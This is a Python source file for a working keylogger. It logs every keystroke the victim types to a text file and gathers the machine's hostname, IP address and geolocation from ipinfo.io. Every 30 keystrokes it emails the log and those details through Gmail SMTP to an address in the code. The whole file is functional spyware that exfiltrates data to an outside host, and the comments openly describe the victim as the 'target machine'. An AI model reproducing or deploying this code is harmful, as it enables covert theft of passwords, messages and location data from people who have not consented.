import os
import smtplib
from email.message import EmailMessage
import pynput
from pynput.keyboard import Key, Listener
import socket
import requests

"""
function used to send an email with your log.txt file attacchements.
"""
info = {}

def server_smtp():
#credential server smtp must be imported in your environment path
    EMAIL_ADDRESS = os.environ.get('DB_USER')
    EMAIL_PASSWORD = os.environ.get('DB_PASSWORD')

    #send Hostname and Ip_address of target machine
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    #print(EMAIL_ADDRESS)
    #print(EMAIL_PASSWORD)

    geo_location()
    print(info)
    msg = EmailMessage()
    msg['Subject'] = 'text email keylogger'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = 'email'
    msg.set_content(f'Hostname: {hostname} and Ip address: {ip_address} this is the retrieve information about location: {info}')

    with open('log.txt', 'r') as f:
        file_data = f.read()
        file_name = f.name

    msg.add_attachment(file_data, filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

"""
function used to store anything you write on your keyboard and after 10 types they are stored in a file
"""
count = 0
keys = []

def on_press(key):
    global keys, count
    
    keys.append(key)
    count += 1
    #print("{0} pressed".format(key))

    if count >= 30:
        count = 0
        write_on_file(keys)
        keys = []
        server_smtp()
"""
function used to stop your program
"""
def on_release(key):
    if key == Key.esc:
        return False

"""
function used for write all characters into a file.txt. we used simple replace with a space blank if we captures special characters like (ctrl + c ecc..)
we go in an other lines if we type spacebar
"""

def write_on_file(keys):
    with open("log.txt", "a") as f:
        
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0 :
                f.write('\n')
            elif k.find("Key") == -1 :
                f.write(k)
"""
we use listener to listen a key events
"""


"""
function used for retrieve information about geo_location
"""
def geo_location():
    global info
    res = requests.get('https://ipinfo.io/')
    data  = res.json()
    info = {'city': data['city'], 'region': data['region'], 'country': data['country'], 'loc': data['loc'], 'postal': data['postal'], 'timezone': data['timezone']}

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
